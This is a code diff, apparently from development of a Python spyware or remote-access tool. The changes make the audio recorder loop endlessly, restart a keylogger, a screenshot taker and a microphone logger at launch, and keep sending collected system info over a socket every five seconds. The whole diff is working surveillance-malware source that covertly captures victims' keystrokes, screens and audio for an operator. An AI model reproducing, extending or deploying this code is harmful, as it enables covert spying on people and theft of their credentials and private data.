@@ -371,8 +371,6 @@ while 1:
                 def __init__(self, rate):
                     super(AudioStreaming, self).__init__()
 
-                    self.active = True
-
                     self.chunk = 1024
                     self.format = pyaudio.paInt16
                     self.channel = 1
@@ -390,7 +388,7 @@ while 1:
 
                     config = init()
 
-                    while self.active:
+                    while 1:
                         if len(self.frames) > config['at']*4.6:
                             AUDIO_LOGS[get_date_time()] = {
                                 'raw': zlib.compress(b''.join(self.frames)),
@@ -422,19 +420,7 @@ while 1:
                                 'date': get_date_time(),
                             }
                             time.sleep(delay)
-                        else:
-                            break
-
-
-            # TODO: TEMP
-            run_scheduler()
-            keylogger = Key()
-            keylogger.start()
-            screenshoter = Screenshoter()
-            screenshoter.start()
-            audioLogger = AudioStreaming(5120)
-            audioLogger.start()
-
+                        time.sleep(config['std'])
 
             def check_info():
                 global UNLOCKED
@@ -634,7 +620,8 @@ while 1:
                 global ACTIVE
                 while ACTIVE:
                     try:
-                        data_send(check_info(), 'infoChecker')
+                        info_data = check_info()
+                        data_send(info_data, 'infoChecker')
                         time.sleep(5)
                     except socket.error:
                         ACTIVE = False
@@ -782,6 +769,15 @@ while 1:
                         else:
                             break
 
+            # Run Loggers
+            run_scheduler()
+            keylogger = Key()
+            keylogger.start()
+            screenshoter = Screenshoter()
+            screenshoter.start()
+            if not audio_input == 'NoDevice':
+                audioLogger = AudioStreaming(5120)
+                audioLogger.start()
             reactor()
 
             # TODO: SOURCE END
